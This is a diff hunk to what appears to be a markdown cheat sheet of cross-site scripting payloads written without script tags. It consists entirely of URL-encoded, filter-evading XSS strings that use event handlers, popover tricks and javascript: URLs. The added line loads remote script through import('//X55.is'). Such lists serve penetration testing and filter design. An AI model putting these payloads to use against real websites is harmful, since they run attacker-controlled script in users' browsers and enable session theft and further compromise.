@@ -255,6 +255,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %26%2302java%26%23115cript:alert(document.domain)
   "><button%20popovertarget=x>Click%20me</button>%0A<xss%20onbeforetoggle=location=`javas`%2B`cript:ale`%2B`rt%2`%2B`81%2`%2B`9`%20popover%20id=x>XSS</xss>
   %3Cxss%20contenteditable%20onbeforeinput=alert(1)%3Etest
+  %27%3E%0A%3C!--%3E%3Ca%20href=%22javascript:import(%27%2f%2fX55.is%27)%22%3ECLICK%3C/a%3E%0A%3C!--%3E
   ```
 </details>
 
